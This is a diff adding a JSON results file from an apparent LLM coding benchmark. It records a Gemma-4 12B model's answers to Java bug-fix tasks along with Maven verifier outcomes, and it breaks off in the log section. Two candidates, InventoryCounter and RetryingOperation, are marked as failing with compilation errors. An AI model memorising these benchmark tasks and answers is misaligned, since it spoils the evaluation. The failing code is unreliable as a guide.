@@ -1,0 +1,977 @@
+{
+  "tag": "gemma4-12b-ct-73-full50",
+  "url": "http://192.168.0.73:8012",
+  "model": "gemma-4-12B-it-qat-w4a16-ct",
+  "notes": "Gemma-4 12B QAT-CT .73:8012 ctx=131072; reasoning_effort stripped; --tool-call-parser gemma4 --reasoning-parser gemma4",
+  "selected_categories": [
+    "java-spring",
+    "ts-angular",
+    "sql-migrations",
+    "mcp-tools",
+    "security-review",
+    "long-context"
+  ],
+  "timeout_override_s": null,
+  "runner_python": "3.12.3",
+  "suite_git_commit": "db9233a134e6c1f4a72e8551677905736b93f48d",
+  "suite_git_dirty": true,
+  "preflight": {
+    "checked_at": "2026-11-11T13:05:23.644120+00:00",
+    "models_url": "http://192.168.0.73:8012/v1/models",
+    "requested_model": "gemma-4-12B-it-qat-w4a16-ct",
+    "requested_model_found": true,
+    "available_model_ids": [
+      "gemma-4-12B-it-qat-w4a16-ct"
+    ],
+    "selected_model_entry": {
+      "id": "gemma-4-12B-it-qat-w4a16-ct",
+      "object": "model",
+      "created": 1794402323,
+      "owned_by": "vllm",
+      "root": "/mnt/nvme1n1p1/models/gemma4-12b-ct",
+      "parent": null,
+      "max_model_len": 131072,
+      "permission": [
+        {
+          "id": "modelperm-b9e7bd5aab5e882f",
+          "object": "model_permission",
+          "created": 1794402323,
+          "allow_create_engine": false,
+          "allow_sampling": true,
+          "allow_logprobs": true,
+          "allow_search_indices": false,
+          "allow_view": true,
+          "allow_fine_tuning": false,
+          "organization": "*",
+          "group": null,
+          "is_blocking": false
+        }
+      ]
+    }
+  },
+  "started_at": "2026-11-11T13:05:23.646332+00:00",
+  "finished_at": "2026-11-11T13:18:09.211574+00:00",
+  "total_wall_s": 765.5652260780334,
+  "total_pass": 35,
+  "total_tasks": 42,
+  "categories": [
+    {
+      "category": "java-spring",
+      "n_pass": 8,
+      "n_total": 10,
+      "wall_s": 117.27954149246216,
+      "returncode": 1,
+      "timed_out": false,
+      "tasks": [
+        {
+          "id": "01-pagination-calculator",
+          "passed": true,
+          "elapsed_s": 7.7,
+          "reasons": [],
+          "artifact": {
+            "task_id": "01-pagination-calculator",
+            "category": "java-spring",
+            "class_name": "PaginationCalculator",
+            "response_length": 650,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\n/**\n * Computes pagination metadata for a result set.\n */\npublic class PaginationCalculator {\n\n    /**\n     * Returns the total number of pages needed to display {@code totalItems}\n     * items at {@code pageSize} items per page. Must round UP (a partial\n     * last page still counts as a full page).\n     */\n    public int totalPages(int totalItems, int pageSize) {\n        if (pageSize <= 0) {\n            throw new IllegalArgumentException(\"pageSize must be positive\");\n        }\n        if (totalItems <= 0) {\n            return 0;\n        }\n        return (totalItems + pageSize - 1) / pageSize;\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\n/**\n * Computes pagination metadata for a result set.\n */\npublic class PaginationCalculator {\n\n    /**\n     * Returns the total number of pages needed to display {@code totalItems}\n     * items at {@code pageSize} items per page. Must round UP (a partial\n     * last page still counts as a full page).\n     */\n    public int totalPages(int totalItems, int pageSize) {\n        if (pageSize <= 0) {\n            throw new IllegalArgumentException(\"pageSize must be positive\");\n        }\n        if (totalItems <= 0) {\n            return 0;\n        }\n        return (totalItems + pageSize - 1) / pageSize;\n    }\n}\n",
+            "candidate_length": 639,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=PaginationCalculatorTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "02-discount-calculator",
+          "passed": true,
+          "elapsed_s": 9.6,
+          "reasons": [],
+          "artifact": {
+            "task_id": "02-discount-calculator",
+            "category": "java-spring",
+            "class_name": "DiscountCalculator",
+            "response_length": 862,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport java.math.BigDecimal;\nimport java.math.RoundingMode;\n\n/**\n * Applies a percentage discount to a price.\n */\npublic class DiscountCalculator {\n\n    /**\n     * Applies {@code discountPercent} (e.g. 15 for 15%) to {@code price} and\n     * returns the discounted price, rounded to 2 decimal places (HALF_UP).\n     */\n    public BigDecimal applyDiscount(BigDecimal price, BigDecimal discountPercent) {\n        if (price == null || discountPercent == null) {\n            throw new IllegalArgumentException(\"price and discountPercent must not be null\");\n        }\n        BigDecimal discountAmount = price.multiply(discountPercent).divide(BigDecimal.valueOf(100), 2, RoundingMode.HALF_UP);\n        BigDecimal finalPrice = price.subtract(discountAmount);\n        return finalPrice.setScale(2, RoundingMode.HALF_UP);\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport java.math.BigDecimal;\nimport java.math.RoundingMode;\n\n/**\n * Applies a percentage discount to a price.\n */\npublic class DiscountCalculator {\n\n    /**\n     * Applies {@code discountPercent} (e.g. 15 for 15%) to {@code price} and\n     * returns the discounted price, rounded to 2 decimal places (HALF_UP).\n     */\n    public BigDecimal applyDiscount(BigDecimal price, BigDecimal discountPercent) {\n        if (price == null || discountPercent == null) {\n            throw new IllegalArgumentException(\"price and discountPercent must not be null\");\n        }\n        BigDecimal discountAmount = price.multiply(discountPercent).divide(BigDecimal.valueOf(100), 2, RoundingMode.HALF_UP);\n        BigDecimal finalPrice = price.subtract(discountAmount);\n        return finalPrice.setScale(2, RoundingMode.HALF_UP);\n    }\n}\n",
+            "candidate_length": 851,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=DiscountCalculatorTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "03-inventory-counter",
+          "passed": false,
+          "elapsed_s": 8.9,
+          "reasons": [
+            "mvn test failed (exit 1):",
+            "[ERROR] COMPILATION ERROR :"
+          ],
+          "artifact": {
+            "task_id": "03-inventory-counter",
+            "category": "java-spring",
+            "class_name": "InventoryCounter",
+            "response_length": 1007,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport java.util.concurrent.atomic.AtomicInteger;\n\n/**\n * Thread-safe counter tracking available inventory across concurrent\n * reservation attempts.\n */\npublic class InventoryCounter {\n\n    private final int available;\n\n    public InventoryCounter(int initialStock) {\n        this.available = initialStock;\n    }\n\n    /**\n     * Attempts to reserve {@code quantity} units. Returns true and\n     * decrements available stock if enough units are available; returns\n     * false (and leaves stock unchanged) otherwise. Must be safe to call\n     * concurrently from many threads without ever allowing available stock\n     * to go negative or losing a reservation that should have succeeded.\n     */\n    public synchronized boolean reserve(int quantity) {\n        if (available >= quantity) {\n            available -= quantity;\n            return true;\n        }\n        return false;\n    }\n\n    public synchronized int getAvailable() {\n        return available;\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport java.util.concurrent.atomic.AtomicInteger;\n\n/**\n * Thread-safe counter tracking available inventory across concurrent\n * reservation attempts.\n */\npublic class InventoryCounter {\n\n    private final int available;\n\n    public InventoryCounter(int initialStock) {\n        this.available = initialStock;\n    }\n\n    /**\n     * Attempts to reserve {@code quantity} units. Returns true and\n     * decrements available stock if enough units are available; returns\n     * false (and leaves stock unchanged) otherwise. Must be safe to call\n     * concurrently from many threads without ever allowing available stock\n     * to go negative or losing a reservation that should have succeeded.\n     */\n    public synchronized boolean reserve(int quantity) {\n        if (available >= quantity) {\n            available -= quantity;\n            return true;\n        }\n        return false;\n    }\n\n    public synchronized int getAvailable() {\n        return available;\n    }\n}\n",
+            "candidate_length": 996,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=InventoryCounterTest",
+                "test"
+              ],
+              "returncode": 1,
+              "output_tail": "[ERROR] COMPILATION ERROR : \n[ERROR] /home/berdachuk/tmp/qualbench-java-03-inventory-counter-r4a42kzi/src/main/java/com/qualbench/bugs/InventoryCounter.java:[26,13] cannot assign a value to final variable available\n[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.13.0:compile (default-compile) on project java-spring-fixture: Compilation failure\n[ERROR] /home/berdachuk/tmp/qualbench-java-03-inventory-counter-r4a42kzi/src/main/java/com/qualbench/bugs/InventoryCounter.java:[26,13] cannot assign a value to final variable available\n[ERROR] \n[ERROR] -> [Help 1]\n[ERROR] \n[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.\n[ERROR] Re-run Maven using the -X switch to enable full debug logging.\n[ERROR] \n[ERROR] For more information about the errors and possible solutions, please read the following articles:\n[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException\nPicked up JAVA_TOOL_OPTIONS: -Xms1024m -Xmx8192m\nPicked up _JAVA_OPTIONS: -Xms1024m -Xmx8192m\nWARNING: A terminally deprecated method in sun.misc.Unsafe has been called\nWARNING: sun.misc.Unsafe::staticFieldBase has been called by com.google.inject.internal.aop.HiddenClassDefiner (file:/home/berdachuk/soft/apache-maven-3.9.11/lib/guice-5.1.0-classes.jar)\nWARNING: Please consider reporting this to the maintainers of class com.google.inject.internal.aop.HiddenClassDefiner\nWARNING: sun.misc.Unsafe::staticFieldBase will be removed in a future release"
+            }
+          }
+        },
+        {
+          "id": "04-date-range-overlap",
+          "passed": true,
+          "elapsed_s": 7.9,
+          "reasons": [],
+          "artifact": {
+            "task_id": "04-date-range-overlap",
+            "category": "java-spring",
+            "class_name": "DateRangeOverlap",
+            "response_length": 614,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport java.time.LocalDate;\n\n/**\n * Checks whether two date ranges (inclusive on both ends) overlap.\n */\npublic class DateRangeOverlap {\n\n    /**\n     * Returns true if [startA, endA] and [startB, endB] share at least one\n     * day in common. Both ranges are inclusive of their start and end\n     * dates. A range that merely touches at a single shared boundary day\n     * counts as overlapping.\n     */\n    public boolean overlaps(LocalDate startA, LocalDate endA, LocalDate startB, LocalDate endB) {\n        return !startA.isAfter(endB) && !startB.isAfter(endA);\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport java.time.LocalDate;\n\n/**\n * Checks whether two date ranges (inclusive on both ends) overlap.\n */\npublic class DateRangeOverlap {\n\n    /**\n     * Returns true if [startA, endA] and [startB, endB] share at least one\n     * day in common. Both ranges are inclusive of their start and end\n     * dates. A range that merely touches at a single shared boundary day\n     * counts as overlapping.\n     */\n    public boolean overlaps(LocalDate startA, LocalDate endA, LocalDate startB, LocalDate endB) {\n        return !startA.isAfter(endB) && !startB.isAfter(endA);\n    }\n}\n",
+            "candidate_length": 603,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=DateRangeOverlapTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "05-csv-field-parser",
+          "passed": true,
+          "elapsed_s": 13.3,
+          "reasons": [],
+          "artifact": {
+            "task_id": "05-csv-field-parser",
+            "category": "java-spring",
+            "class_name": "CsvFieldParser",
+            "response_length": 1260,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\n/**\n * Splits a single line of naive CSV into fields, respecting double-quoted\n * fields that may themselves contain commas.\n */\npublic class CsvFieldParser {\n\n    /**\n     * Splits {@code line} on commas, except commas that appear inside a\n     * double-quoted field (e.g. {@code a,\"b,c\",d} -> [\"a\", \"b,c\", \"d\"]).\n     * Surrounding quotes on a quoted field are stripped from the result.\n     */\n    public List<String> parseLine(String line) {\n        List<String> fields = new ArrayList<>();\n        if (line == null || line.isEmpty()) {\n            return fields;\n        }\n\n        StringBuilder currentField = new StringBuilder();\n        boolean inQuotes = false;\n        char[] chars = line.toCharArray();\n\n        for (int i = 0; i < chars.length; i++) {\n            char c = chars[i];\n\n            if (c == '\"') {\n                inQuotes = !inQuotes;\n            } else if (c == ',' && !inQuotes) {\n                fields.add(currentField.toString());\n                currentField.setLength(0);\n            } else {\n                currentField.append(c);\n            }\n        }\n        fields.add(currentField.toString());\n\n        return fields;\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\n/**\n * Splits a single line of naive CSV into fields, respecting double-quoted\n * fields that may themselves contain commas.\n */\npublic class CsvFieldParser {\n\n    /**\n     * Splits {@code line} on commas, except commas that appear inside a\n     * double-quoted field (e.g. {@code a,\"b,c\",d} -> [\"a\", \"b,c\", \"d\"]).\n     * Surrounding quotes on a quoted field are stripped from the result.\n     */\n    public List<String> parseLine(String line) {\n        List<String> fields = new ArrayList<>();\n        if (line == null || line.isEmpty()) {\n            return fields;\n        }\n\n        StringBuilder currentField = new StringBuilder();\n        boolean inQuotes = false;\n        char[] chars = line.toCharArray();\n\n        for (int i = 0; i < chars.length; i++) {\n            char c = chars[i];\n\n            if (c == '\"') {\n                inQuotes = !inQuotes;\n            } else if (c == ',' && !inQuotes) {\n                fields.add(currentField.toString());\n                currentField.setLength(0);\n            } else {\n                currentField.append(c);\n            }\n        }\n        fields.add(currentField.toString());\n\n        return fields;\n    }\n}\n",
+            "candidate_length": 1249,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=CsvFieldParserTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "06-moving-average",
+          "passed": true,
+          "elapsed_s": 10.9,
+          "reasons": [],
+          "artifact": {
+            "task_id": "06-moving-average",
+            "category": "java-spring",
+            "class_name": "MovingAverage",
+            "response_length": 1025,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport java.util.ArrayDeque;\nimport java.util.Deque;\n\n/**\n * Maintains a simple moving average over the last {@code windowSize}\n * values added.\n */\npublic class MovingAverage {\n\n    private final int windowSize;\n    private final Deque<Double> window = new ArrayDeque<>();\n    private double sum = 0.0;\n\n    public MovingAverage(int windowSize) {\n        if (windowSize <= 0) {\n            throw new IllegalArgumentException(\"windowSize must be positive\");\n        }\n        this.windowSize = windowSize;\n    }\n\n    /**\n     * Adds a new value, evicting the oldest value once the window exceeds\n     * {@code windowSize} entries, and returns the current average over the\n     * values currently in the window.\n     */\n    public double add(double value) {\n        window.addLast(value);\n        sum += value;\n        if (window.size() > windowSize) {\n            double removed = window.removeFirst();\n            sum -= removed;\n        }\n        return sum / window.size();\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport java.util.ArrayDeque;\nimport java.util.Deque;\n\n/**\n * Maintains a simple moving average over the last {@code windowSize}\n * values added.\n */\npublic class MovingAverage {\n\n    private final int windowSize;\n    private final Deque<Double> window = new ArrayDeque<>();\n    private double sum = 0.0;\n\n    public MovingAverage(int windowSize) {\n        if (windowSize <= 0) {\n            throw new IllegalArgumentException(\"windowSize must be positive\");\n        }\n        this.windowSize = windowSize;\n    }\n\n    /**\n     * Adds a new value, evicting the oldest value once the window exceeds\n     * {@code windowSize} entries, and returns the current average over the\n     * values currently in the window.\n     */\n    public double add(double value) {\n        window.addLast(value);\n        sum += value;\n        if (window.size() > windowSize) {\n            double removed = window.removeFirst();\n            sum -= removed;\n        }\n        return sum / window.size();\n    }\n}\n",
+            "candidate_length": 1014,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=MovingAverageTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "07-money",
+          "passed": true,
+          "elapsed_s": 15.4,
+          "reasons": [],
+          "artifact": {
+            "task_id": "07-money",
+            "category": "java-spring",
+            "class_name": "Money",
+            "response_length": 1586,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport java.math.BigDecimal;\nimport java.util.Objects;\n\n/**\n * An immutable value object representing an amount in a given currency.\n * Two Money instances are equal if they have the same currency and the\n * same numeric amount (regardless of trailing zeros / scale, e.g. 2.50 and\n * 2.5 are equal), and must produce equal hashCode()s when equal(), per the\n * general equals/hashCode contract.\n */\npublic final class Money {\n\n    private final BigDecimal amount;\n    private final String currency;\n\n    public Money(BigDecimal amount, String currency) {\n        this.amount = Objects.requireNonNull(amount);\n        this.currency = Objects.requireNonNull(currency);\n    }\n\n    public BigDecimal getAmount() {\n        return amount;\n    }\n\n    public String getCurrency() {\n        return currency;\n    }\n\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (!(o instanceof Money)) return false;\n        Money other = (Money) o;\n        // compareTo ignores scale differences (2.50 vs 2.5), matching the\n        // documented equality contract above.\n        return amount.compareTo(other.amount) == 0 && currency.equals(other.currency);\n    }\n\n    @Override\n    public int hashCode() {\n        // To satisfy the equals/hashCode contract where 2.50 equals 2.5,\n        // we must use a representation of the BigDecimal that is independent of scale.\n        // stripTrailingZeros() ensures that 2.50 and 2.5 both become 2.5.\n        return Objects.hash(amount.stripTrailingZeros(), currency);\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport java.math.BigDecimal;\nimport java.util.Objects;\n\n/**\n * An immutable value object representing an amount in a given currency.\n * Two Money instances are equal if they have the same currency and the\n * same numeric amount (regardless of trailing zeros / scale, e.g. 2.50 and\n * 2.5 are equal), and must produce equal hashCode()s when equal(), per the\n * general equals/hashCode contract.\n */\npublic final class Money {\n\n    private final BigDecimal amount;\n    private final String currency;\n\n    public Money(BigDecimal amount, String currency) {\n        this.amount = Objects.requireNonNull(amount);\n        this.currency = Objects.requireNonNull(currency);\n    }\n\n    public BigDecimal getAmount() {\n        return amount;\n    }\n\n    public String getCurrency() {\n        return currency;\n    }\n\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (!(o instanceof Money)) return false;\n        Money other = (Money) o;\n        // compareTo ignores scale differences (2.50 vs 2.5), matching the\n        // documented equality contract above.\n        return amount.compareTo(other.amount) == 0 && currency.equals(other.currency);\n    }\n\n    @Override\n    public int hashCode() {\n        // To satisfy the equals/hashCode contract where 2.50 equals 2.5,\n        // we must use a representation of the BigDecimal that is independent of scale.\n        // stripTrailingZeros() ensures that 2.50 and 2.5 both become 2.5.\n        return Objects.hash(amount.stripTrailingZeros(), currency);\n    }\n}\n",
+            "candidate_length": 1575,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=MoneyTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "08-retrying-operation",
+          "passed": false,
+          "elapsed_s": 12.8,
+          "reasons": [
+            "mvn test failed (exit 1):",
+            "[ERROR] COMPILATION ERROR :"
+          ],
+          "artifact": {
+            "task_id": "08-retrying-operation",
+            "category": "java-spring",
+            "class_name": "RetryingOperation",
+            "response_length": 1372,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport java.util.concurrent.Callable;\n\n/**\n * Retries a flaky operation up to a fixed number of times, re-throwing the\n * last failure if every attempt fails.\n */\npublic class RetryingOperation {\n\n    /**\n     * Calls {@code operation} up to {@code maxAttempts} times. Returns the\n     * first successful result. If every attempt throws, re-throws the\n     * exception from the LAST attempt (not the first), wrapped in a\n     * RuntimeException if it isn't one already.\n     */\n    public <T> T runWithRetry(Callable<T> operation, int maxAttempts) throws Exception {\n        if (maxAttempts <= 0) {\n            throw new IllegalArgumentException(\"maxAttempts must be positive\");\n        }\n        Exception lastFailure = null;\n        for (int attempt = 1; attempt <= maxAttempts; attempt++) {\n            try {\n                return operation.call();\n            } catch (Exception e) {\n                lastFailure = e;\n            }\n        }\n        \n        if (lastFailure != null) {\n            if (lastFailure instanceof RuntimeException) {\n                throw (RuntimeException) lastFailure;\n            } else if (lastFailure instanceof Error) {\n                throw (Error) lastFailure;\n            } else {\n                throw new RuntimeException(lastFailure);\n            }\n        }\n        return null;\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport java.util.concurrent.Callable;\n\n/**\n * Retries a flaky operation up to a fixed number of times, re-throwing the\n * last failure if every attempt fails.\n */\npublic class RetryingOperation {\n\n    /**\n     * Calls {@code operation} up to {@code maxAttempts} times. Returns the\n     * first successful result. If every attempt throws, re-throws the\n     * exception from the LAST attempt (not the first), wrapped in a\n     * RuntimeException if it isn't one already.\n     */\n    public <T> T runWithRetry(Callable<T> operation, int maxAttempts) throws Exception {\n        if (maxAttempts <= 0) {\n            throw new IllegalArgumentException(\"maxAttempts must be positive\");\n        }\n        Exception lastFailure = null;\n        for (int attempt = 1; attempt <= maxAttempts; attempt++) {\n            try {\n                return operation.call();\n            } catch (Exception e) {\n                lastFailure = e;\n            }\n        }\n        \n        if (lastFailure != null) {\n            if (lastFailure instanceof RuntimeException) {\n                throw (RuntimeException) lastFailure;\n            } else if (lastFailure instanceof Error) {\n                throw (Error) lastFailure;\n            } else {\n                throw new RuntimeException(lastFailure);\n            }\n        }\n        return null;\n    }\n}\n",
+            "candidate_length": 1361,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=RetryingOperationTest",
+                "test"
+              ],
+              "returncode": 1,
+              "output_tail": "[ERROR] COMPILATION ERROR : \n[ERROR] /home/berdachuk/tmp/qualbench-java-08-retrying-operation-4f8v4vwr/src/main/java/com/qualbench/bugs/RetryingOperation.java:[33,24] incompatible types: java.lang.Exception cannot be converted to java.lang.Error\n[ERROR] /home/berdachuk/tmp/qualbench-java-08-retrying-operation-4f8v4vwr/src/main/java/com/qualbench/bugs/RetryingOperation.java:[34,31] incompatible types: java.lang.Exception cannot be converted to java.lang.Error\n[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.13.0:compile (default-compile) on project java-spring-fixture: Compilation failure: Compilation failure: \n[ERROR] /home/berdachuk/tmp/qualbench-java-08-retrying-operation-4f8v4vwr/src/main/java/com/qualbench/bugs/RetryingOperation.java:[33,24] incompatible types: java.lang.Exception cannot be converted to java.lang.Error\n[ERROR] /home/berdachuk/tmp/qualbench-java-08-retrying-operation-4f8v4vwr/src/main/java/com/qualbench/bugs/RetryingOperation.java:[34,31] incompatible types: java.lang.Exception cannot be converted to java.lang.Error\n[ERROR] -> [Help 1]\n[ERROR] \n[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.\n[ERROR] Re-run Maven using the -X switch to enable full debug logging.\n[ERROR] \n[ERROR] For more information about the errors and possible solutions, please read the following articles:\n[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException\nPicked up JAVA_TOOL_OPTIONS: -Xms1024m -Xmx8192m\nPicked up _JAVA_OPTIONS: -Xms1024m -Xmx8192m\nWARNING: A terminally deprecated method in sun.misc.Unsafe has been called\nWARNING: sun.misc.Unsafe::staticFieldBase has been called by com.google.inject.internal.aop.HiddenClassDefiner (file:/home/berdachuk/soft/apache-maven-3.9.11/lib/guice-5.1.0-classes.jar)\nWARNING: Please consider reporting this to the maintainers of class com.google.inject.internal.aop.HiddenClassDefiner\nWARNING: sun.misc.Unsafe::staticFieldBase will be removed in a future release"
+            }
+          }
+        },
+        {
+          "id": "09-request-id-generator",
+          "passed": true,
+          "elapsed_s": 15.9,
+          "reasons": [],
+          "artifact": {
+            "task_id": "09-request-id-generator",
+            "category": "java-spring",
+            "class_name": "RequestIdGenerator",
+            "response_length": 1670,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport org.springframework.stereotype.Component;\nimport java.util.concurrent.atomic.AtomicInteger;\n\n/**\n * A singleton Spring bean that generates sequential request IDs of the\n * form \"REQ-<currentUserId>-<sequence>\" for the currently-processing\n * request. Because this bean is a singleton (Spring's default scope), it\n * is shared across all concurrently-handled HTTP requests in the\n * application -- it must never hold per-request mutable state as an\n * instance field.\n */\n@Component\npublic class RequestIdGenerator {\n\n    private final AtomicInteger sequence = new AtomicInteger(0);\n\n    /** \n     * To avoid holding per-request mutable state in a singleton, \n     * we use ThreadLocal to ensure that the currentUserId and the \n     * sequence are isolated to the specific thread handling the request.\n     */\n    private final ThreadLocal<String> threadUserId = new ThreadLocal<>();\n    private final ThreadLocal<Integer> threadSequence = ThreadLocal.withInitial(() -> 0);\n\n    /** Called once at the start of handling a request for the given user. */\n    public void startRequest(String userId) {\n        this.threadUserId.set(userId);\n    }\n\n    /** Called to produce the next ID for the request started above. */\n    public String generateId() {\n        int currentSeq = threadSequence.get();\n        int nextSeq = currentSeq + 1;\n        threadSequence.set(nextSeq);\n        \n        String userId = threadUserId.get();\n        if (userId == null) {\n            throw new IllegalStateException(\"startRequest must be called before generateId\");\n        }\n        \n        return \"REQ-\" + userId + \"-\" + nextSeq;\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport org.springframework.stereotype.Component;\nimport java.util.concurrent.atomic.AtomicInteger;\n\n/**\n * A singleton Spring bean that generates sequential request IDs of the\n * form \"REQ-<currentUserId>-<sequence>\" for the currently-processing\n * request. Because this bean is a singleton (Spring's default scope), it\n * is shared across all concurrently-handled HTTP requests in the\n * application -- it must never hold per-request mutable state as an\n * instance field.\n */\n@Component\npublic class RequestIdGenerator {\n\n    private final AtomicInteger sequence = new AtomicInteger(0);\n\n    /** \n     * To avoid holding per-request mutable state in a singleton, \n     * we use ThreadLocal to ensure that the currentUserId and the \n     * sequence are isolated to the specific thread handling the request.\n     */\n    private final ThreadLocal<String> threadUserId = new ThreadLocal<>();\n    private final ThreadLocal<Integer> threadSequence = ThreadLocal.withInitial(() -> 0);\n\n    /** Called once at the start of handling a request for the given user. */\n    public void startRequest(String userId) {\n        this.threadUserId.set(userId);\n    }\n\n    /** Called to produce the next ID for the request started above. */\n    public String generateId() {\n        int currentSeq = threadSequence.get();\n        int nextSeq = currentSeq + 1;\n        threadSequence.set(nextSeq);\n        \n        String userId = threadUserId.get();\n        if (userId == null) {\n            throw new IllegalStateException(\"startRequest must be called before generateId\");\n        }\n        \n        return \"REQ-\" + userId + \"-\" + nextSeq;\n    }\n}\n",
+            "candidate_length": 1659,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=RequestIdGeneratorTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "10-lru-cache",
+          "passed": true,
+          "elapsed_s": 14.7,
+          "reasons": [],
+          "artifact": {
+            "task_id": "10-lru-cache",
+            "category": "java-spring",
+            "class_name": "LruCache",
+            "response_length": 1287,
+            "response_excerpt": "```java\npackage com.qualbench.bugs;\n\nimport java.util.LinkedHashMap;\nimport java.util.Map;\n\n/**\n * A fixed-capacity cache that evicts the Least Recently Used entry when\n * full. \"Recently used\" must be updated on both writes (put) AND reads\n * (get) -- reading an entry counts as using it, so it should not be the\n * next one evicted.\n */\npublic class LruCache<K, V> {\n\n    private final int capacity;\n    private final Map<K, V> map;\n\n    public LruCache(int capacity) {\n        if (capacity <= 0) {\n            throw new IllegalArgumentException(\"capacity must be positive\");\n        }\n        this.capacity = capacity;\n        // The third parameter 'accessOrder' must be true for LinkedHashMap \n        // to reorder elements based on access (get/put).\n        this.map = new LinkedHashMap<>(capacity, 0.75f, true) {\n            @Override\n            protected boolean removeEldestEntry(Map.Entry<K, V> eldest) {\n                return size() > LruCache.this.capacity;\n            }\n        };\n    }\n\n    public void put(K key, V value) {\n        map.put(key, value);\n    }\n\n    public V get(K key) {\n        return map.get(key);\n    }\n\n    public boolean containsKey(K key) {\n        return map.containsKey(key);\n    }\n\n    public int size() {\n        return map.size();\n    }\n}\n```",
+            "candidate_java": "package com.qualbench.bugs;\n\nimport java.util.LinkedHashMap;\nimport java.util.Map;\n\n/**\n * A fixed-capacity cache that evicts the Least Recently Used entry when\n * full. \"Recently used\" must be updated on both writes (put) AND reads\n * (get) -- reading an entry counts as using it, so it should not be the\n * next one evicted.\n */\npublic class LruCache<K, V> {\n\n    private final int capacity;\n    private final Map<K, V> map;\n\n    public LruCache(int capacity) {\n        if (capacity <= 0) {\n            throw new IllegalArgumentException(\"capacity must be positive\");\n        }\n        this.capacity = capacity;\n        // The third parameter 'accessOrder' must be true for LinkedHashMap \n        // to reorder elements based on access (get/put).\n        this.map = new LinkedHashMap<>(capacity, 0.75f, true) {\n            @Override\n            protected boolean removeEldestEntry(Map.Entry<K, V> eldest) {\n                return size() > LruCache.this.capacity;\n            }\n        };\n    }\n\n    public void put(K key, V value) {\n        map.put(key, value);\n    }\n\n    public V get(K key) {\n        return map.get(key);\n    }\n\n    public boolean containsKey(K key) {\n        return map.containsKey(key);\n    }\n\n    public int size() {\n        return map.size();\n    }\n}\n",
+            "candidate_length": 1276,
+            "verifier": {
+              "command": [
+                "mvn",
+                "-q",
+                "-o",
+                "-Dtest=LruCacheTest",
+                "test"
+              ],
+              "returncode": 0
+            }
+          }
+        }
+      ],
+      "artifact_count": 10,
+      "logs": [
+        "[ERROR] /home/berdachuk/tmp/qualbench-java-03-inventory-counter-r4a42kzi/src/main/java/com/qualbench/bugs/InventoryCounter.java:[26,13] cannot assign a value to final variable available",
+        "[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.13.0:compile (default-compile) on project java-spring-fixture: Compilation failure",
+        "[ERROR] /home/berdachuk/tmp/qualbench-java-03-inventory-counter-r4a42kzi/src/main/java/com/qualbench/bugs/InventoryCounter.java:[26,13] cannot assign a value to final variable available",
+        "[ERROR] ",
+        "[ERROR] -> [Help 1]",
+        "[ERROR] ",
+        "[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.",
+        "[ERROR] Re-run Maven using the -X switch to enable full debug logging.",
+        "[ERROR] ",
+        "[ERROR] For more information about the errors and possible solutions, please read the following articles:",
+        "[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException",
+        "Picked up JAVA_TOOL_OPTIONS: -Xms1024m -Xmx8192m",
+        "Picked up _JAVA_OPTIONS: -Xms1024m -Xmx8192m",
+        "WARNING: A terminally deprecated method in sun.misc.Unsafe has been called",
